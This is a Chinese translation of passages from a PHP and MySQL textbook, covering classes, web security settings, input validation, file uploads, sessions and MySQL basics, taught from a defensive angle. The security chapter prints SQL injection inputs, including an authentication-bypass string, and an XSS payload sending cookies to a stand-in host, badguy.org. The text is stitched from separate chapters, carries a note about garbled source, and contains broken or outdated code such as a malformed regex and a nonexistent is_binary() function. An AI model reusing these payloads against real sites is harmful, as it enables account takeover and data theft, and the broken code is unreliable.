  \n面向对象程序的基本元素是对象。将对象理解为物理对象容易。例如，汽车是一个对象。汽车具有属性（如颜色、型号和轮胎）。汽车也可以做一些事情，如向前、向后、停车、翻滚和死亡（反正）。通常，对象是名词。人是一个对象。动物、办公室、垃圾桶、云和按钮也是。然而，对象不仅仅是对象。像名词一样，对象通常是概念性的。例如，银行账户不是你手里的东西，但可以被认为是一个对象。例如计算机账户或贷款。文件通常是一个对象。数据库也是。邮件、地址、歌曲和日期都可以是对象。网络应用程序中的对象可能是目录、购物车、订单或客户列表。类是用于创建对象的模板或模式\
  \ PHP 代码。类定义了对象的属性（也称为属性）。它还定义了对象可以做的事——它的责任。例如，你写了一个类来定义汽车具有四个轮子和一个引擎，并列出了汽车可以做的事，如向前和停车。然后，给定该类，你可以使用以下语句创建一个对象：\n\
  ```php\n$myCar = new Car();\n```\n`myCar` 是从 `Car` 类创建的。汽车具有四个轮子和一个引擎并可以向前和停车。当你使用对象\
  \ `$myCar` 时，你可能会发现它缺少了一些重要物品，如门或方向盘。从技术角度来看，对象是用户定义的数据类型。从类创建对象的过程被称为实例化。\n\n##\
  \ 定义类\n在你确定了对象、属性和方法后，准备好定义类了。类是对象的模板（模式）。\n\n## 编写类语句\n使用以下格式的类语句来定义属性和方法：\n```php\n\
  class className {\n    // 定义属性\n    // 定义方法\n}\n```\n你可以使用任何有效的标识符作为 `className`。\n\
  \n### 设置属性\n在定义类时，在类的顶部声明所有属性，如下所示：\n```php\nclass Car {\n    private $color;\n\
  \    private $tires;\n    private $gas;\n    // 方法语句\n}\n```\nPHP 不需要你声明变量。在本书的其他\
  \ PHP 脚本中，变量没有声明就直接使用了。然而，在类中声明属性要好得多。通过包含声明，类更容易理解。遗漏。如果你想为属性设置默认值，可以，但允许的值是限制的。你可以声明简单值，但不能声明计算值，详细如下：\n\
  以下变量声明允许默认值：\n```php\nprivate $color = “black”;\nprivate $gas = 10;\nprivate $tires\
  \ = 4;\n```\n以下变量声明不允许默认值：\n```php\nprivate $color = “blue.”\nprivate $gas = 10\
  \ - 3;\nprivate $tires = 2 * 2;\n```\n变量声明中允许数组，只要值是简单的，如下：\n```php\nprivate $doors\
  \ = array(“front”,”back”);\n```\n\n### 使用 $this 访问属性\n在类内部，`$this` 是指向同一类属性的特殊变量。`$this`\
  \ 不能在类外部使用。它被设计用于类内部语句访问同类的变量。使用 `$this` 的格式如下：\n```php\n$this->varname\n```\n例如，在具有属性\
  \ `$totalCost` 的 `CustomerOrder` 类中，你通过以下方式访问 `$totalCost`：\n```php\n$this->totalCost\n\
  ```\n使用 `$this` 指类内部的 `$totalCost`。你可以在任何以下语句中使用 `$this`：\n```php\n$this->totalCost\
  \ = 200.25;\nif($this->totalCost > 1000)\n    $product[$this->size] = $price;\n\
  ```\n\n### 构造函数\n构造函数是 PHP 5 中添加的特殊方法，在创建对象时执行。不需要构造函数，如果你不想在对象创建时设置任何属性值或执行任何操作。只允许一个构造函数。如下所示：\n\
  ```php\nclass Order {\n    function construct() {\n        $this->total = 0;\n \
  \   }\n}\n```\n构造函数命名为 `__construct`（两个下划线）。构造函数方法看起来如下：\n```php\nclass Order {\n\
  \    private $total = 0;\n    function __construct() {\n        $this->total = 0;\n\
  \    }\n}\n```\n(注：由于提供的原始文本存在大量重复和乱码，上述翻译已根据逻辑进行了清理和对齐。以下是整理后的核心内容：)\n\n# 第 5 章：考虑安全\n\
  ## 本章\n- 保护服务器和 Apache 服务器\n- 安全地配置 PHP\n- 安全地处理错误\n\n## 变量清洗\n作为 Web 开发者，你需要确保你的\
  \ Web 应用程序是安全的。如果你还在服务器上执行管理工作，那么你也需要保护服务器。保护应用程序意味着确保来自用户的所有输入都经过清洗或根据已知良好值进行检查，除非你通过程序检查了它才允许任何输入。保护服务器意味着尝试将\
  \ Web 应用程序保持在自己的沙箱中，这样即使服务器受到攻击，损害也是有限的。本章讨论了 Web 应用的安全。\n\n## 保护服务器\n服务器本身应该被保护。这通常意味着加固服务器并确保服务器使用防火墙。\n\
  \n## 加固服务器\n通常意味着通过卸载不必要的服务来加固操作系统。例如，通常没有理由在运行公共网站的同一台服务器上运行服务器。禁用和卸载不必要的服务可以减少服务器的暴露，这意味着攻击者可以利用的东西更少。像\
  \ SELinux 和安全工具可以增强服务器安全性并减少成功攻击者破坏自身小沙箱的能力。\n\n## 使用防火墙\n无论你是在服务器本身使用防火墙，还是在互联网与网络连接处使用防火墙，或两者兼顾，都应该确保有一个防火墙拦截除允许端口外的连接，例如典型\
  \ Web 服务器的 TCP 端口 80 和 443。更好的场景是在入口点（互联网与网络连接处）和服务器本身都运行防火墙。这样做意味着即使攻击者找到了进入网络的方法，Web\
  \ 服务器也将受到保护。所有主要的操作系统都包含了防火墙工具，且它们既易于设置又易于维护。\n\n\n\n\n\n### 表 5-1 php .ini 推荐的安全设置\n\
  \n| 选项 | 说明 |\n| :--- | :--- |\n| `safe_mode = on` | 限制 PHP 脚本仅访问由运行脚本的同一用户拥有的的文件，防止目录遍历攻击。\
  \ |\n| `safe_mode_gid = off` | 此设置结合 `safe_mode` 使用，允许 PHP 脚本仅访问所有者和组与运行脚本时的用户/组相匹配的文件。\
  \ |\n| `open_basedir = directory` | 启用此参数时，PHP 脚本只能访问位于指定目录下的文件。 |\n| `expose_php\
  \ = off` | 防止 PHP 在发送给用户的 HTTP 标头中泄露其自身的信息。 |\n| `register_globals = off` | 如果启用此参数，所有环境变量、`GET`、`POST`、`cookie`\
  \ 和服务器变量都将被注册为全局变量，使攻击者可以轻松获取。除非别无选择必须启用，否则应保持 `register_globals` 为关闭状态。 |\n| `display_errors\
  \ = off` | 防止向用户显示 PHP 错误和警告。PHP 警告不仅会让你的网站看起来不专业，而且经常会暴露敏感信息，如路径名和 SQL 查询。 |\n\
  | `log_errors = on` | 启用此参数时，所有的警告和错误都将写入日志文件，你可以稍后检查这些警告和错误。 |\n| `error_log =\
  \ filename` | 指定 PHP 写入错误和警告的日志文件名。 |\n\n\n\n\n\n# 安全地处理错误\n\n在理想的世界中，当你创建一个要求用户输入名字的表单时，你可以合理地预期他们会输入像\
  \ John 或 Jane 这样的名字。不幸的是，你也会遇到留空表单、输入地址或简单地输入一串随机字符的用户。而那些都是友好的用户。攻击者则出于不法目的向你的表单中输入内容。请考虑以下关于坏人如何运作以及如何领先他们一步的信息。\n\
  \n## 了解危险\n\n攻击者使用不同的方法让你的网站面临风险。一种攻击类型被称为 `SQL 注入`。在这样的攻击中，攻击者假设表单中收集的信息将用于一个 `SQL`\
  \ 查询并在你的数据库上执行。攻击者在你的表单字段中输入字符，这些字符在用于查询中时会给你带来麻烦。\n\n例如，攻击者可能会输入类似 `John; drop%20\
  \ table%20users` 的内容。如果你的应用程序设置为将用户姓名输入数据库，那么你的 `SQL` 查询看起来可能会像这样：\n`INSERT INTO\
  \ users VALUES (John; drop table users);`\n\n取决于你的服务器配置，服务器可能会读取该查询并愉快地从你的数据库中删除\
  \ `users` 表。它可能会对语法稍作抱怨，但如果你有松散的数据库配置，它将完全按照该行代码的指示执行：将“John”添加到 `users` 表中，然后删除名为\
  \ `users` 的表。这可不好。\n\n在另一个 `SQL 注入` 示例中，在表单的用户名字段中输入字符以绕过身份验证。假设用户在用户名字段中输入了以下字符：\n\
  `John’ OR ‘foo’ = ‘foo’ --`\n\n你的脚本可能包含以下语句来测试用户名和密码：\n`$sql = “SELECT * FROM User\
  \ WHERE userID = ‘$_POST[userID]’ AND password = ‘$_POST[password]’”;`\n\n如果你在不更改代码的情况下插入用户输入的代码，你将得到以下\
  \ `SQL` 查询：\n`$sql = “SELECT * FROM User WHERE username = ‘John’ OR ‘foo’ = ‘foo’\
  \ -- ‘ AND password = ‘$_POST[password]’”;`\n\n此查询允许用户在没有有效用户名或密码的情况下登录。在 `WHERE`\
  \ 子句的第一个短语中，`foo = foo` 是真的。然后，`--` 将查询的其余部分变为注释，在查询中实际上是不可见的。因此，此查询始终匹配某行。\n\n\
  另一种危险的表单输入类型是攻击者在你的表单字段中输入脚本。例如，攻击者可能在表单字段输入以下内容：\n`<script>document.location='http://badguy.org/bad.php?cookies='+\
  \ document.cookie </script>`\n\n如果你存储这些文本并将其发送给访问你网站的人，你的访问者会将与你的应用程序相关的 cookies\
  \ 发给坏人。另一个恶意脚本可能是：\n`<script language=php eval(rm *); </script>`\n\n## 测试意外输入\n\n\
  你可以对预期的用户输入数据数据做出几点相当准确的假设。例如，当你询问姓名时，你预期以下情况是真实的：\n* 数据是字母形式的 —— 没有数字。\n* 名字可能包含空格、单引号或连字符，例如\
  \ Mary Jane、O’Hara 或 Anne-Marie。\n* 数据肯定不包含 `HTML` 标签或其他代码片段。\n\n这些假设是测试意外输入的关键。通过使用\
  \ `PHP` 的 `preg_match()` 函数将输入通过正则表达式，以确定它是否包含任何除空格、单引号或连字符以外的非字母字符。正则表达式（或简称 `regex`）是所有输入测试的本质。请参考第\
  \ 2 章关于正则表达式的解释。\n\n你需要的不仅仅是清理输入。如果你将任何输入反射回用户（例如确认屏幕），你还必须清理由应用程序生成并发送给用户的 `HTML`。恶意用户可以向你的应用程序中注入标记，诱导另一个用户点击链接，该链接将他或她（在不知情的情况下）离开你的网站并进入一个钓鱼克隆网站。\n\
  \n为了防止此类攻击 —— 它通常被称为用户劫持或跨站脚本 —— 对你任何计划用于渲染 `HTML` 的值使用 `htmlentities()`，如此示例所示：\n\
  ```php\n$inputString = \"<b>Hello World</b>\";\n$safe_string = htmlentities($inputString);\n\
  ```\n在这个示例中，`$safe_string` 将包含以下字符串：`&lt;b&gt;Hello World&lt;/b&gt;`。更好的解决方案是再次使用\
  \ `preg_match` 并确保输入中没有意外字符。换句话说，如果你注意到除了允许字符以外的字符，只需报错并向用户显示一条消息，指示其输入无效。\n\n大多数时候，你测试用户的输入，它们会无故障地通过你的正则表达式。但当出现问题时你该怎么办？处理意外输入的简单方法是完全停止应用程序。然而，尽管这种方法会阻止坏数据进入你的应用程序，但它也会让仅仅输入错误信息的合法用户感到困惑和沮丧。因此，更好的解决方案是将用户返回输入界面并让他或她重试。你可以让用户知道哪些字段导致了问题，使系统更加用户友好。第六卷第三章显示了如何处理表单，当在表单字段中输入无效数据时重新显示表单。\n\
  \n如果你的测试捕获了看起来像恶意活动的内容，你可能需要额外措施，例如写入日志文件、通知管理员，甚至阻止产生输入的 IP 地址。\n\n## 检查所有表单数据\n\
  \n检查表单中的所有信息，包括用户从列表、复选框或单选按钮选择的任何信息。这些字段也包含坏信息。坏数据是如何从下拉列表或单选按钮进入的？很容易。在点击提交按钮后，通过\
  \ `GET` 和 `POST` 数据，恶意人员可以简单地更改任何值。你可以在 `php.ini` 中限制文件大小。关键是使用正则表达式验证你接收的内容与实际收到的内容。例如，你可以检查列表变量：\n\
  ```php\npreg_match(\"/male|female)/\")\n```\n\n## 清理变量\n\n有时，当用户输入失败时，告诉用户返回重试并不是一个选择。当你不得不使用用户给你的内容时，可以使用一些技术来确保坏数据不会破坏支持应用程序的底层系统，如电子邮件传输。后面的章节将告诉你是如何防止坏输入破坏工作。\n\
  \n## 转换 HTML 特殊字符\n\n有时，你想允许用户向你的应用程序中输入 `HTML`。例如，博客系统通常允许用户发布超链接。你不需要让应用程序打开用户可能放入任何内容。如果你允许用户输入\
  \ `HTML`，应该始终使用 `htmlentities()` 函数将 HTML 特殊字符转换为实体。`htmlentities()` 函数接收字符串作为参数。该函数对以下\
  \ HTML 特殊字符进行简单的查找和替换：\n* `&`（和符号）变为 `&amp;`\n* `\"`（双引号）变为 `&quot;`\n* `'`（单引号）变为\
  \ `&#39;`\n* `<`（小于）变为 `&lt;`\n* `>`（大于）变为 `&gt;`\n\n如果你需要转义具有 HTML 特殊含义的字符，请使用\
  \ `htmlentities()` 而不是 `htmlspecialchars()`。请查看 `www.w3schools.com/html/entities.asp`\
  \ 获取有关 HTML 特殊字符的信息。\n\n## 在不损害文件系统的上传文件\n\n大多数应用程序不需要上传文件。如果不允许文件，应用程序更安全。你可以通过\
  \ `php.ini` 文件中的 `file_uploads` 设置防止文件上传。默认设置为如下：\n```ini\nfile_uploads = On\n```\n\
  将设置改为 `Off` 以防止 PHP 脚本中的任何文件。某些应用程序需要用户上传文件。不幸的是，这种需求也带来了严重问题的风险。恶意用户可以：\n* 发起拒绝服务（DoS）攻击。\n\
  * 覆盖现有文件。\n* 在服务器上放置恶意代码以后使用。\n\n由于 Web 应用程序的开放性，无法完全保护应用程序，但你可以减轻危险。\n\n## 避免对文件系统的\
  \ DOS 攻击\n\n文件上传创建了 DOS 攻击的风险，因为恶意用户可以上传巨大的文件并在过程中使用文件系统中所有的资源。上传大文件可以通过阻止其写入临时文件或虚拟内存文件来有效防止崩溃。你可以在\
  \ `php.ini` 中限制文件大小，但这样做无法阻止每秒尝试上传数百个 2MB 文件的脚本攻击。你应该在 `php.ini` 中对文件大小设置限制。你还应该为上传的文件创建一个独立的系统。这个独立的系统可以将恶意与其他服务器部分隔离。上传系统可能会被垃圾文件填，导致你的应用程序功能不可用\
  \ —— 但至少整个服务器不会崩溃。\n\n## 验证文件\n\n文件上传后，你应该验证它是否为合法文件。虽然你可能无法过滤所有的恶意上传，但你可以减少明显的那些。这里有一些验证文件的方法：\n\
  * 验证文件名扩展名。这种检查不是最稳健的测试（因为人们很容易重命名文件以新的扩展名），但它很容易，可以捕捉一些试图通过你的图像上传函数上传 `spam_sender.php`\
  \ 等文件的简单破解者。\n* 测试你预期的基本文件类型。例如，如果你预期图像，可以使用 `is_binary()` 函数过滤掉文本文件（如 PHP 脚本），如下所示：\n\
  ```php\n$input = $_POST['input_file'];\nif (is_binary($input)) {\n    // 正常继续\n\
  } else {\n    // 拒绝文件，重定向浏览器等\n }\n```\n* 通过如 F-Prot（可在 `www.f-prot.com`）之类的杀病毒工具运行文件。\n\
  \n## 使用 FTP 函数确保安全文件上传\n\nWeb 应用程序允许用户出于各种原因上传文件是很常见的。例如，某些留言板允许用户上传显示在每个用户帖子旁的小图像或头像。其他应用程序允许你上传数据进行分析。可以使用\
  \ PHP 内置的 `fopen()` 函数，它打开指向文件或 URL 的流，允许用户上传文件。不幸的是，这种方法很容易被恶意用户利用，他们可以利用它从远程服务器上传文件到你的\
  \ Web 服务器上。防止这种利用需要你禁用 `php.ini` 中的两个设置：`register_globals` 和 `url_fopen`。在禁用这两个设置后，用户在没有显式启用的情况下使用\
  \ PHP 内置的文件上传。使用 PHP 的 `FTP` 函数，这比 `fopen()` 方法安全得多。你可以直观地使用 FTP 函数：首先建立连接，然后上传你需要的文件，最后关闭连接。列表\
  \ 5-1 显示了如何在 PHP 中使用 FTP 函数：\n\n### 使用 FTP 函数\n\n```php\n<?php\n// 设置建立连接\n$connection_id\
  \ = ftp_connect($ftp_server);\n// 使用用户名和密码登录\n$login_result = ftp_login($connection_id,\
  \ $username, $password);\n// 检查连接\nif (!$connection_id || (!$login_result)) {\n\
  \    echo \"连接失败!\";\n    echo \"尝试连接 $ftp_server\";\n    exit;\n} else {\n    echo\
  \ \"已连接到 $ftp_server\";\n}\n// 上传文件\n$upload = ftp_put($connection_id, $destination_file,\
  \ $source_file, FTP_BINARY);\n// 检查上传状态\nif (!$upload) {\n    echo \"上传失败!\";\n\
  } else {\n    echo \"已上传 $source_file 到 $ftp_server\";\n}\n// 关闭连接\nftp_close($connection_id);\n\
  ?>\n```\n\n这里是最常用的 FTP 函数及其参数：\n* `ftp_connect(string $host [, int $port [, int\
  \ $timeout])`：连接到 FTP 服务器 ——在这种情况下是你的 Web 服务器。\n* `ftp_login(resource $ftp_stream,\
  \ string $username, string $password)`：将登录凭据发送到 FTP 服务器。\n* `ftp_put(resource $ftp_stream,\
  \ string $remote_file, string $local_file, int $mode [, int $startpos])`：从本地机器将文件放到服务器。\n\
  * `ftp_get(resource $ftp_stream, string $local_file, string $remote_file, int $mode\
  \ [, int $respos])`：从服务器获取文件并送到本地机器。\n* `ftp_close(resource $ftp_stream)`：关闭到服务器的连接。\n\
  \n一旦完成，你需要关闭 FTP 流；否则，你将拥有一个易被劫持的连接。\n\n# 第 6 章：使用 Sessions 跟踪访问者\n\n在本章中：\n* 理解\
  \ sessions 和 cookies\n\n本章介绍了 PHP 中用于跨页面跟踪访问者的内置方法，称为 session。本章从对 sessions 和 cookies\
  \ 的介绍开始，然后直接进入如何使用 sessions 来跟踪访问者。\n\n## 理解 sessions 和 cookies\n\n你无疑见过能够跟踪你身份的网站，可能在你登录后欢迎你或向你提供有关账户的自定义信息。实现此点的办法几种，包括在每次请求时发送数据。但不安全，对于今天的\
  \ Web 应用程序来说也不足够。幸运的是，有一种更好的方法 —— sessions。\n\n### 查看 sessions\n\nPHP 中的 session\
  \ 是一种从页面到页面跟踪用户的安全方法。通过 session，你可以存储用户信息，例如他们的电子邮件地址、电话号码以及你拥有的任何其他细节并在网站需要的地方自动填写这些信息。例如，假设在登录时从数据库中加载用户的姓名和邮箱地址。你可以将这些信息存储在\
  \ session 中，本质上对用户隐藏，直到你使用它。像使用其他变量一样使用 session 变量。在后台，sessions 被存储在一个名为 `$_SESSION`\
  \ 的数组中。你可以像使用 PHP 数组一样存储值。例如，你可以这样跟踪邮箱地址和姓名：\n```php\n$_SESSION['emailAddress']\
  \ = \"me@example.com\";\n$_SESSION['firstName'] = \"Steve\";\n```\n你还可以使用 sessions\
  \ 来跟踪 Web 表单填写的信息，而无需通过隐藏变量在站点中携带这些信息。\n\n## 处理 cookies\n\nSessions 通过浏览器 cookies\
  \ 传递，cookies 是在 Web 浏览器之间发送的少量额外信息。实际的信息位或这些信息位到底是什么，取决于你这个程序员。例如，你可以发送一个包含用户名字的\
  \ cookie。该 cookie 然后可以存储在用户的计算机上，当她下次访问网站时，cookie 就会被发送到你的程序，程序将呈现个性化的问候。然而，cookies\
  \ 就像你从用户获取的任何数据一样 —— 来自 cookies 的数据需要清理（正如我们在上一章中讨论的），因为它们是不可的。换句话说，一旦你的程序向访问者的浏览器发送了\
  \ cookie，访问者就可以编辑或更改该 cookie 为他想要的任何内容。所以如果你（Web 开发者）使用 cookie 存储用户名，访问者可以将用户名更改为他想要的任何内容，然后将其发送回你的程序。\n\
  \n用户编辑 cookie 的可能性在很大程度上通过简单地使用 sessions 解决了。当创建一个 session cookie 时，它使用一个哈希值，这是一个长字符串。这意味着即使用户更改了\
  \ cookie 值（换句话说，如果他们更改了哈希值），他们并没有真正改变你直接在程序中使用的任何内容。相反，PHP 代表你处理该 cookie 中哈希值的翻译，然后你就可以继续使用这些东西。sessions\
  \ 存储在服务器上，用户永远看不到 `$_SESSION` 数组。当然，使用 sessions 意味着浏览器中开启 cookies。如果没有开启，用户就无法使用应用程序。因此，继续讨论的逻辑位置是显示如何检查\
  \ cookies 是否开启。\n\n### 检查 cookies 是否开启\n\n使用 PHP 中的 `cookie()` 函数在浏览器中设置 cookie。然后如果你的程序可以读取该\
  \ cookie，你就知道 cookies 已开启。`cookie()` 函数接受几个参数来定义 cookie 的行为。例如，设置 cookie 的名称和有效时间。为了我们的目的，你可以按照以下步骤检查浏览器中的\
  \ cookies 是否开启：\n\n1. 打开文本编辑器并创建一个空文件。\n2. 在文件内输入以下代码：\n```php\n<?php\nif (isset($_GET['cookie']))\
  \ {\n    if (isset($_COOKIE['cookie'])) {\n        echo \"Cookies 已开启\";\n    }\
  \ else {\n        echo \"Cookies 未开启\";\n    }\n} else {\n    setcookie('cookie',\
  \ \"testvalue\");\n    header(\"Location: \" . $_SERVER['PHP_SELF'] . \"?cookie=1\"\
  );\n}\n?>\n```\n3. 将文件保存为 `cookie.php` 放在根目录。\n4. 将浏览器指向 `http://localhost/cookie.php`，你会看到类似图\
  \ 6-1 的页面。\n\n如果浏览器中没有开启 cookies，你会看到类似图 6-2 的页面。注意：如果你想在禁用 cookies 的情况下测试页面，可以这样做。首先关闭浏览器并重新打开（不要进入\
  \ `cookie.php` 页面）。在 Internet Explorer 中，进入 Internet 设置。在隐私选项卡上，将设置滑块阻止所有 cookies。在\
  \ Firefox 中，进入选项并选择隐私选项卡。在历史部分，取消勾选“接受网站 cookie”。现在加载 `cookie.php`。\n\n现在你知道 cookies\
  \ 已开启，可以安全地使用 sessions。\n\n## 使用 sessions 传递数据\n\n在大多数浏览器开启 cookies 的情况下，你可以开始使用\
  \ sessions 在 PHP 应用程序之间存储数据。\n\n### 启动 session\n\n使用 sessions 的关键是 `session_start()`\
  \ 函数。你在每个页面调用 `session_start()`，随后访问 `$_SESSION` 数组中的所有项。`session_start()` 这个函数的名字可能有点奇怪，因为在大多数页面你只是想继续\
  \ session 并访问那里的变量。但实际上，`session_start()` 执行了两件事：在需要时启动一个新的 session，在适当的情况下继续现有会。`session_start()`\
  \ 函数只需这样调用：\n```php\n<?php\nsession_start();\n// 其他 PHP 语句\n?>\n```\n这里是跟踪应用程序第一个页面的几个代码。这显示了\
  \ `session_start()` 函数的使用，然后创建一个持有初始访问时间的变量。列表 6-1 显示了第一个页面，`page1.php`。\n\n###\
  \ 创建 session 变量\n\n```php\n<?php\nsession_start();\n$_SESSION['accessTime'] = date(\"\
  M/d/Y g:i:s\");\nprint \"这是第 1 页<br />\";\nprint \"你访问应用程序的时间: \" . $_SESSION['accessTime'];\n\
  print \"<div><a href=\\\"page2.php\\\">继续下一页</a></div>\";\n?>\n```\n在浏览器查看时，页面看起来像图\
  \ 6-3。应用程序中的下一个页面启动 session 并访问任何已经在 session 中设置的变量。列表 6-2 显示了第二个页面，`page2.php`。\n\
  \n### 页面访问 session 变量\n\n```php\n<?php\nsession_start();\nprint \"这是第 2 页<br />\"\
  ;\nprint \"你访问应用程序的时间: \" . $_SESSION['accessTime'];\nprint \"<div><a href=\\\"\
  page3.php\\\">继续下一页</a></div>\";\n?>\n```\n注意列表 6-2 代码中，变量 `$_SESSION['accessTime']`\
  \ 没有再次设置，而是在 session 启动后被访问的。当你在 `page1.php` 上点击链接进入下一页时，你会得到一个类似图 6-4 的页面。\n\n\
  你可以在 session 中存储几乎任何内容，但你应该意识到 session 可能会、有时会由于各种原因消失。session 消失的原因之一是超时。如果用户在页面上停留太久，当他们再次使用应用程序时，session\
  \ 可能不在了。在第七卷中，你将看到如何更改会超时值。然而，即使你更改了超时，session 仍然可能会。例如，如果用户在会话期间清理了 cookies，那么\
  \ session cookie 就会消失并启动一个新的。session 消失的实际影响是你之前设置的任何变量也会消失。因此，在使用它们之前，检查 session\
  \ 是否包含你预期的值是一个良好做法。这样做有几种方法。一种方法是在访问它们之前检查所有变量。例如，你可以在输出前检查它。\n\n### 检查 session\
  \ 是否设置\n\n```php\n<?php\nsession_start();\nif (isset($_SESSION['cookie'])) {\n \
  \   if (isset($_COOKIE['cookie'])) {\n        echo \"session 已开启\";\n    } else\
  \ {\n        echo \"session 未开启\";\n    }\n} else {\n    $_SESSION['cookie'] = \"\
  testvalue\";\n    header(\"Location: \" . $_SERVER['PHP_SELF']);\n}\n?>\n```\n\n\
  \n\n\n\n## 表 6-1：选择会话选项\n\n| 选项 | 描述 |\n| :--- | :--- |\n| `session_id` | 获取当前会话标识符或设置一个。\
  \ |\n| `session_name` | 获取当前会话名称或设置一个。 |\n| `session_destroy` | 取消当前会话中的所有变量。 |\n\
  \n第六卷展示了如何使用 `session_destroy` 来在网站上提供注销功能。你可以在 PHP 官方网站 [www.php.net/manual/book.session.php](http://www.php.net/manual/book.session.php)\
  \ 上查阅其他与会话相关的函数。\n\n## 第五卷 MySQL 账户权限\n\n| 权限 | 描述 |\n| :--- | :--- |\n| `ALL` |\
  \ 所有权限 |\n| `ALTER` | 可以修改表结构 |\n| `CREATE` | 可以创建新的数据库或表 |\n| `DELETE` | 可以删除表中的行\
  \ |\n| `DROP` | 可以删除数据库或表 |\n| `FILE` | 可以在服务器上读写文件 |\n| `GRANT` | 可以更改 MySQL 账户的权限\
  \ |\n| `INSERT` | 可以向表中插入新行 |\n| `SELECT` | 可以从表中读取数据 |\n| `SHUTDOWN` | 可以关闭 MySQL\
  \ 服务器 |\n| `UPDATE` | 可以修改表中的数据 |\n| `USAGE` | 无权限 |\n\n\n\n\n\n# 第一章：MySQL 简介\n\
  \n欲了解 MySQL 的更多信息，请访问 [www.dummies.com/extras/phpmysql](http://www.dummies.com/extras/phpmysql)。\n\
  \n任何动态网站都需要后端数据库。数据库可以包含网页向用户显示的信息，或者数据库的用途可能是为了存储用户提供的信息。在某些应用程序中，数据库既提供可用信息，又存储新信息。\n\
  \nMySQL 是最流行的网站数据库，它的开发目标是快速且轻量级，专为网站设计。MySQL 在使用 PHP 编写的网站中特别流行，因为 PHP 和 MySQL\
  \ 配合得非常好。本章将介绍 MySQL，并解释它的工作原理以及你如何与它进行通信。正如第一本书第 3 章所讨论，许多信息也适用于 SQLite 数据库。\n\n\
  ## 检查 MySQL 的工作原理\n\nMySQL 软件由 MySQL 服务器、若干个辅助 MySQL 数据库管理的实用程序，以及 MySQL 服务器需要的一些辅助软件（你不需要了解这些）组成。系统的核心是\
  \ MySQL 服务器。\n\nMySQL 服务器是数据库系统的管理器。它处理你所有的数据库指令。例如，如果你想创建一个新数据库，你会向 MySQL 服务器发送一条消息，例如：“创建一个新数据库并命名为\
  \ `newdata`。”然后，MySQL 服务器会在其数据目录中创建一个子目录，将该子目录命名为 `newdata`，并将具有所需格式的文件放入 `newdata`\
  \ 子目录中。同样，要向该数据库添加数据，你会向 MySQL 服务器发送消息，给它数据并告诉它你想将数据添加到何处。\n\n## 数据库结构\n\n在向 MySQL\
  \ 服务器传递指令之前，它必须处于运行并等待请求状态。MySQL 服务器通常被设置为在计算机启动时启动并持续运行。这是网站的常见设置。不过，并不是非得将其设置为计算机启动时启动。如果你有需要，可以在任何访问数据库时手动启动它。当它运行运行时，MySQL\
  \ 服务器会持续监听指向它的消息。安装和启动 MySQL 服务器的内容将在第一本书第 4 章中讨论。\n\nMySQL 是一个关系型数据库管理系统 (RDBMS)。你的\
  \ MySQL 服务器可以同时管理多个数据库。事实上，许多人可能由同一个 MySQL 服务器管理不同的数据库。每个数据库由一个用于存放数据的结构和数据本身组成。数据库可以没有数据，只有一个完全为空的结构，等待数据被存储其中。\n\
  \n数据库中的数据存储在一个或多个表中。在添加任何数据之前，你必须先创建数据库和表。首先你创建一个空数据库，然后向数据库中添加空表。数据库表的组织方式与你熟悉的表类似——行和列。每一行代表数据库中的一个实体，例如客户、书籍或项目。每一列包含关于该实体的一项信息，例如客户名、书名或项目开始日期。特定行和列的交叉点（即表中的单个单元格）被称为字段（field）。数据库中的表可以是关联的。通常，一个表中的某行与另一个表中的几行相关。例如，你可能有一个包含你拥有的书籍数据的数据库。你有一个\
  \ `book` 表和一个 `author` 表。`author` 表中的某一行可能包含 `book` 表中几本书的作者信息。当表建立关联时，你会在其中一个表中包含一列，用于存储与另一个表数据匹配的数据。只有在创建了数据库结构后，你才能添加数据。本微型书籍第\
  \ 3 章提供了更多关于数据库结构以及创建结构指令的信息。\n\n## 与 MySQL 通\n\n你与数据库的所有交互都是通过向 MySQL 服务器传递消息完成的。MySQL\
  \ 服务器必须能够理解你发送它的指令。你使用结构化查询语言 (SQL) 进行通信，这是一种标准的计算机语言，至少以某种形式被大多数数据库管理系统所理解。为了发出\
  \ MySQL 能理解的请求，你构建一个 SQL 语句并将其发送给 MySQL 服务器。\n\n### 构建 SQL 查询\n\nSQL 几乎就是英语；它主要由英语单词组成，组合成听起来类似于英语句子的单词字符串。幸运的是，通常你编写可以运行的\
  \ SQL 查询不需要理解任何晦涩的技术术语。\n\n每个语句的第一个单词是它的名称，这是一个动词（动词），告诉 MySQL 你想做什么。我们在本微型书籍中讨论的语句有\
  \ `CREATE`、`DROP`、`ALTER`、`SHOW`、`INSERT`、`LOAD`、`SELECT`、`UPDATE` 和 `DELETE`。这些基础词汇足以创建——交互——网站上的数据库。语句名称后面跟着单词和短语——有些是必须的，有些是可选的——它们告诉\
  \ MySQL 如何执行该操作。例如，你始终需要告诉 MySQL 要创建什么，并且始终需要告诉它要向哪个表插入数据或从哪个表选择数据。\n\n以下是一个典型的\
  \ SQL 语句。如你所见，它使用了英语单词：\n\n```sql\nSELECT lastName FROM Member\n```\n\n当语句使用 `SELECT`\
  \ 时，它被称为查询（query），因为你正在查询数据库获取信息。此查询检索了名为 `Member` 的表中存储的所有姓。更复杂的查询（如下所示）没有那么像英语：\n\
  \n```sql\nSELECT lastName,firstName FROM Member WHERE state=\"CA\" AND city=\"Fresno\"\
  \ ORDER BY lastName\n```\n\n此查询检索了住在 Fresno 的成员的所有姓和名，然后按姓的字母顺序排列。尽管这个查询没有那么像英语，但仍然非常清晰。\n\
  \n在构建 SQL 语句时，请记住以下通用点：\n\n*   **大小写**：在本书中，我们将 SQL 单词全部大写；而变量信息（如列名）通常使用小写。这是为了方便阅读。SQL\
  \ 单词的大小写并不重要；例如，`select` 等于 `SELECT`，`from` 等于 `FROM`。对于 MySQL 而言，表名、列名和其他变量信息的大小写是敏感的。如果你使用的是\
  \ Unix 或 Linux，MySQL 需要精确匹配列名。\n*   **空格**：SQL 单词之间必须用一个或多个空格分隔。使用多少个空格并不重要；SQL\
  \ 也不忽略行尾。你可以在 SQL 语句的任何地方换行，也可以在一行内写整个语句。\n*   **引号**：注意查询中的 \"CA\" 和 \"Fresno\"\
  \ 被包含在双引号中。这些被称为字符串。当 MySQL 比较数字（如整数）时，你不需要加引号。\n\n### 发送 SQL 查询\n\n你可以通过多种方式向 MySQL\
  \ 发送 SQL 查询。在本书中，我们涵盖了以下两种方法：\n\n*   **mysql 客户端**：安装 MySQL 时，会自动安装 `mysql` 客户端。可以使用这个简单的客户端来发送查询。\n\
  *   **PHP 内置函数**：通过专门设计的 PHP 内置函数与 MySQL 数据库通信。PHP 脚本访问 MySQL 将在本书第 5 章中详细讨论。\n\n\
